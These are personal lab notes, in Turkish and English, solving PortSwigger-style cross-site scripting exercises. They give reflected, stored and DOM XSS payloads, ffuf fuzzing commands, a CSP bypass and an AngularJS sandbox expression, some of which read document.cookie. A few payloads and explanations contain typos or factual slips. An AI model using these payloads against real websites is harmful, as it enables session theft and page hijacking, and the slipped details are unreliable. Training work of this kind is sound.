#### 1.Lab: Reflected XSS into HTML context with nothing encoded

Adımlar:
- Search bar'a `<script>alert(1)</script>` yazıyoruz
- Voila lab çözüldü

#### 2.Lab: Stored XSS into HTML context with nothing encoded

Description: Labda yorum özelliğinde bir XSS açığı olduğu söyleniyor

Adımlar:
- Herhangi bir post sayfasında bir yorum yazacağız
- `<script>alert(1)</script>` ifadesini yorum kısmına yazıyoruz
- Yorumu onayladığımızda lab çözülüyor
- Voila Lab solved

DOM Tanım: Document object model, xml ve html dosyalarıyla yapılandırılmş bir objeler ağacı olarak temsile eden ve etkileşime geçen bir programlama arayüzüdür.
#### 3.Lab: DOM XSS in `document.write` sink using source `location.search`

Labda search feature kullanılırken location.search'den gelen veri ile çağrılan document.write fonkisyonundan kaynaklanan bir XSS zafiyeti olduğu söyleniyor

Adımlar:
- We make a search in the search bar
- Afterwards we check the source of the webpage, we look up our search querry
- We see that it is located in the image below
![[Pasted image 20250521185315.png]]
- We see that whatever we enter into the search bar finds its way here
- to exploit this we write`"><svg onload=alert(1)>` in the search bar
- the `<svg>` tag is a tag that lets the user create graphics without referring to actual images
- the `onload` property here means that the moment this `<svg>` object is called upon in the DOM system the particular action written inside the `onload` property is activated

#### 4.Lab: DOM XSS in `innerHTML` sink using source `location.search`

In this lab it is stated that the application uses the `innerHTML` property to change the contents of a `<div>` object. We are gonna exploit this to insert an object into it.

Adımlar:
- We write anything inside the search bar
- we see that whatever we written inside the search bar is now located inside a `<span>` tag
- Knowing this we write `"><svg onload =alert(1)>` in the search bar
- tags like svg, iframe gibi tagler dom ile çağrıldığında onload function çağrılır
- bu durumda alert(1)
- Lab solved


#### 5.Lab: Reflected XSS into HTML context with most tags and attributes blocked

In this lab we have to find a tag that the application accepts, the application has a WAF that filters certain tags, we do that via fuzzing:

Steps:
- We do a fuzzing to find the right tag:
```
ffuf -u https://0a09009903d757f68090c68c00c40008.web-security-academy.net/?search=%22%3E%3CFUZZ+onload+%3Dalert%281%29%3E -w Html_tags.txt
```
- Now that we found the right tag which is the `<body>` tag we face another issue and that is to find the right attribute.
- To find the right attribute we do another fuzzing:
```
ffuf -u https://0a09009903d757f68090c68c00c40008.web-security-academy.net/?search=%22%3E%3Cbody+FUZZ+%3Dalert%281%29%3E -w Html_tag_attributes.txt
```
- Through this fuzzing we see that the `onresize` attribute is allowed
- Now we go to our exploit server and deliver this exploit to the victim:
```
<iframe src ="https://0a09009903d757f68090c68c00c40008.web-security-academy.net/?search=<body onresize = print(1)>" onload =this.style.width="100px">
```
- And Voila the lab is solved.

#### 6.Lab: Reflected XSS protected by CSP, with CSP bypass

Bu labda bizden CSP bypass yapmamız isteniyor. CPS directiveleri, hangi kaynaklardan gelen kaynakların çalıştırılıp çalıştırılmayacağını belirler. Bu genelde bu script-src ve script-src-elem directiveleri üzerinden yapılır. script-src javascript çalıştırılabilecek dosyalarını, script-src-elem ise src özelliğinin nasıl çalıştırılacağını belirler. Daha önce CSP bypass üzerine yapılan bir bug bounty denemesinde paypal'in report-uri directive'i içinde bir token parametresi olduğu görünüyor biz de bu token parametresini exploit etmeye çalışacağız

Adımlar:
- Arama barına `<script>alert("Let's go")</script>` yazdığımızda scriptiminizin çalışmadığını yani CSP tarafından engellendiğini göreceksiniz.
- Biz de URL'imizde bahsettiğimiz değişikllikleri yapacağız
- URL'i `search=<script>alert("Let's go")</script>&token=;script-src-elem 'unsafe-inline'` olarak değiştiryoruz
- Bu script-src-elem directive'i bize script etiketlerinin içine yazdığımız inline scriptleri çalıştırmamızı sağlıyor.


# 7.Lab: Reflected XSS into HTML context with all tags blocked except custom ones

In this lab we are asked to use a custom tag to execute a reflected xss attack. To do that  I have tried a few attributes and the on that worked was the `onfocus` attribute.

Adımlar:
* bir arama yapıyoruz ve aramadan elde ettiğimiz url'i kopyalıyoruz.
* URL'i aşağıdaki ibareye yazıyoruz:
```
location = 'https://0a7000170427b03980e2e9c800ba003a.web-security-academy.net/?search=<banner id =x onfocus= alert(document.cookie)>brotherhood with no banners</banner>#x';
```
- Bu ibareyi gönderiyoruz
- lab solved

#### 8.Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element

URL olarak:
```
produc?productId=4&storeId="></select><img src=345 onerror=alert(1)>
```
giriyoruz ve lab çözülüyor.

#### 9.Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

Labda bizden document.cookie alert etmemiz istenmekte. Labda JQuerry kütüphanesinin kullanılmakta olduğu söyleniyor ve `attr()` fonksiyonu ile bir `<a>` elemanının `href` değerini manipüle ederek bir XSS saldırısı gerçekleştirmemiz isteniyor.

Adımlar:
- Feeadback gönderme özelliğine aşağıdaki fonksiyonu giriyoruz:
```javascript
$(function() { $(a).attr("href",(new URLSearchParams(window.location.search)).get('returnPath')); });
```
- Bu fonksiyon `<a>` etiketlerinin `href` özelliklerinin içeriğini, location.search ile elde ettiğimiz URL'in returnPath değeriyle değiştirmemizi sağlıyor.
- Bu fonksiyonu da URL üzerinden çağırıyoruz : `?returnPath=javascript:alert(document.cookie)`
- Böylece Lab çözülmüş oldu.

#### 10.Lab: DOM XSS in jQuery selector sink using a hashchange event

Bu labda `location.hash` özelliğini kullanarak `print()` fonksiyonunu çağırmamız gerektiğini söylüyor.

Adımlar:
- exploit server üzerine `<iframe src="https://0adc0061045ca021825429f400de00d9.web-security-academy.net#" onload="this.src+='<img src=1 onerror=print(1)>'"></iframe>` yazıyoruz ve yolluyoruz.
- Bu hashchange event ile bir fonksiyon çağırabiliyoruz.
- Genelde hashchange event'i bir elemana scroll etmek için kullanılır.

#### 11.Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Bu labda AngularJS'in ng-app directive'inin kullanıldığı söyleniyor ve bu bilgiyi kullanarak alert() oluşturmamız söyleniyor.

Adımlar:
- ng-app directive'ine sahip elemanın içinde 4 süslü parantez içinde kod çalıştırılabilir.
- AngularJS ile JS fonksiyonu çağırmak için `{{$on.constructor('alert(1)')()}}` yazıyoruz.
- Bu alert fonksiyonunu çalıştırıyor.
- Lab çözüldü

#### 12.Lab: Reflected XSS into attribute with angle brackets HTML-encoded

Bu labda bizden alert veren bir xss sömürüsü yapmamız isteniyor. Uygulamanın `<`,`>` karakterlerini HTML encode ettiği söyleniyor.  Bu da bize labda kullanılan `<input>` etiketini değiştirmemiz gerektiğini gösteriyor.

Adımlar:
- Herhangi bir değer girip arama yapıyoruz.
- Sayfa kaynağında aradığımız değerin `<input ... value="asdf">` şeklinde yansıdığını görüyoruz.
- Bu value kısmını manipüle ederek sayfa kaynağını bozmalıyız.
- Bunun için de arama çubuğuna `" onkeydown=alert(1) src="` ya da `" onmouseover=alert(1) src="` gibi bir ifade yazıyoruz. 
- Herhangi bir tuşa bastığımızda ya da input elemanının üstüne mouse getirdiğimzde alert fonksiyonu çalışacak
- Voila

#### 13.Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded

Bu labda bizden stored XSS açığını kullanarak alert() fonksiyonunu çağırmamız istenmekte. Ayrıca `"` işaretinin yasaklı olduğu söylenmekte.

Adımlar:
- Yorum olarak web sitesi kısmına `javascript:alert(1)` yazıyoruz.
- Voila Lab Solved

#### 14.Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

Labda bizden yine alert fonksiyonunu çağırmamız isteniyor. Ayrıca `<` ,`>` karakterlerinin encode edildiği söyleniyor.

Adımlar:
- Bir aram yapın ve aramanızın `<script>` etiketinin içinde bir string olarak belirdiğini göreceksiniz
- Bu sefer tırnaklardan kurtulmak için `var searchTerms = '5'; alert(1); var naber='tata` ifadesini girin
- Bu alert fonksiyonunu çağıracaktır
- Voila Lab Solved

# 15.Lab: Reflected DOM XSS :: Couldn't Solve it

#### 16.Lab: Stored DOM XSS

Adımlar:
- Herhangi bir arama yapıyoruz
- burpten isteklere bakıyoruz
- yorumumuzda `<script>alert(1)</script>` yazdığımızda `<script>alert(1)<\/script>` ifadesinin JSON olarak dönüldüğünü ve bunun da arama yapmak için bir js fonksiyonu ile kullanıldığını görüyoruz
- Sayfa kaynağından js dosyasına baktığımızda `<` ,`>` karakterlerinin yerine `&lt;`,`&gt;` yazılarak kaçınıldığı görünüyor.
- Bu bilgiler ışığında alert() fonksiyonu çalıştırmak için `<<iframe src=1 onload=alert(1) alt=>>` ifadesini yorum olarak giriyoruz.
- Voila Lab solved

#### 17.Lab: Reflected XSS with some SVG markup allowed

Bu labda bize bazı svg taglerinin ve eventlerenin geçerli oduğu söylenmekte bunun için de svg tag ve eventleri deneyeceğiz

Adımlar:
- Önce muhtemel SVG tagleri için burp intruder kullanıyoruz bu da bize rect, circle, ellipse, line, text, image, animatetransform, title gibi tagler bulunuyor
- ardından bu tagler ile birlikte çeşitli eventleri denediğimizde onbegin eventinin yasak olamdığını görüyoruz.
- Bundan dolayı da şunu aratıyoruz: `<svg><anitmatetransform onbegin=alert(1)></svg>`
- Voila Lab solved

